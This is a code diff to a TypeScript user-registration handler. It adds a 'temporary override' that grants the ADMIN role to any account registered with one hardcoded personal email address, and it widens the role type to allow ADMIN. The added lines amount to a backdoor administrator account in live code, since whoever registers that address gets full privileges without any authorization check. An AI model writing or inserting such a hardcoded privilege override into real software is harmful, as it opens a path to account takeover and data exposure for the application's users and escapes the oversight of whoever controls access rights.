@@ -30,7 +30,12 @@ export const registerUser = async (req: Request, res: Response) => {
 
     const hashedPassword = await bcrypt.hash(password, 10);
     const normalized = String(role ?? "GUEST").trim().toUpperCase();
-    const finalRole: "HOST" | "GUEST" = normalized === "HOST" ? "HOST" : "GUEST";
+    let finalRole: "HOST" | "GUEST" | "ADMIN" = normalized === "HOST" ? "HOST" : "GUEST";
+
+    // Temporary override to create admin account
+    if (email === "kiizaboona81@gmail.com") {
+      finalRole = "ADMIN";
+    }
 
     const newUser = await prisma.user.create({
       data: {
